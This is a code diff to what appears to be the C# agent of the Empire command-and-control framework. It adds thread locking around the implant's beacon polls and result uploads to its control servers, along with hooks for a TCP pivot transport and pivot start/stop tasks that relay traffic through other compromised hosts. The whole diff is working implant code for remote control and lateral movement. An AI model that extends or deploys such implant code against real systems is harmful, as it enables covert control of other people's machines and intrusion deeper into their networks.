@@ -87,6 +87,11 @@ AESc = AES encrypted using the client's session key
     {
         public SessionInfo sessionInfo;
 
+        // One lock for every upstream send/poll: the beacon loop and each relay
+        // thread (SharpireTcp) serialise through it, whether the transport is
+        // HTTP or PivotConn.
+        private readonly object _upstreamLock = new object();
+
         internal int MissedCheckins { get; set; }
         private int ServerIndex = 0;
 
@@ -279,6 +284,14 @@ AESc = AES encrypted using the client's session key
                 return malleableResult;
             }
 
+            byte[] pivotResult = null;
+            bool pivotUsed = false;
+            lock (_upstreamLock)
+            {
+                TryPivotGet(ref pivotResult, ref pivotUsed);
+            }
+            if (pivotUsed) return pivotResult;
+
             byte[] results = new byte[0];
             try
             {
@@ -292,7 +305,10 @@ AESc = AES encrypted using the client's session key
 
                 Random random = new Random();
                 string selectedTaskURI = sessionInfo.GetTaskUrIs()[random.Next(0, sessionInfo.GetTaskUrIs().Length)];
-                results = webClient.DownloadData(sessionInfo.GetControlServers()[ServerIndex] + selectedTaskURI);
+                lock (_upstreamLock)
+                {
+                    results = webClient.DownloadData(sessionInfo.GetControlServers()[ServerIndex] + selectedTaskURI);
+                }
             }
             catch (WebException)
             {
@@ -323,6 +339,13 @@ AESc = AES encrypted using the client's session key
             TryMalleableSend(routingPacket, ref malleableUsed);
             if (malleableUsed) return;
 
+            bool pivotSendUsed = false;
+            lock (_upstreamLock)
+            {
+                TryPivotSend(routingPacket, ref pivotSendUsed);
+            }
+            if (pivotSendUsed) return;
+
             Random random = new Random();
             string controlServer = sessionInfo.GetControlServers()[random.Next(sessionInfo.GetControlServers().Length)];
 
@@ -336,7 +359,10 @@ AESc = AES encrypted using the client's session key
                 try
                 {
                     string taskUri = sessionInfo.GetTaskUrIs()[random.Next(sessionInfo.GetTaskUrIs().Length)];
-                    webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
+                    lock (_upstreamLock)
+                    {
+                        webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
+                    }
                 }
                 catch (WebException) { }
             }
@@ -355,6 +381,13 @@ AESc = AES encrypted using the client's session key
         // Counterpart for POST task-result uploads. Same no-op-when-absent
         // semantics as TryMalleableGet.
         partial void TryMalleableSend(byte[] routingPacket, ref bool handled);
+
+        // Tasks 72/73 (tcp pivot start/stop), implemented in Empire.Agent.Pivot.Parent.cs.
+        partial void TryPivotTask(PACKET packet, ref byte[] result);
+
+        // tcp:// pivot transport hooks, implemented in Empire.Agent.Pivot.Child.cs.
+        partial void TryPivotGet(ref byte[] result, ref bool handled);
+        partial void TryPivotSend(byte[] routingPacket, ref bool handled);
 
         private void ProcessTaskingPackets(byte[] encryptedTask)
         {
@@ -506,6 +539,9 @@ AESc = AES encrypted using the client's session key
 	                    jobTracking.jobs[taskId.ToString()].Status = "running";
 	                    return EncodePacket(packet.type, $"Job started: {taskId}", packet.taskId);
                     default:
+                        byte[] pivotResult = null;
+                        TryPivotTask(packet, ref pivotResult);
+                        if (pivotResult != null) return pivotResult;
                         jobTracking.jobs[taskId.ToString()].Status = "error";
                         return EncodePacket(0, "Invalid type: " + packet.type, packet.taskId);
                 }
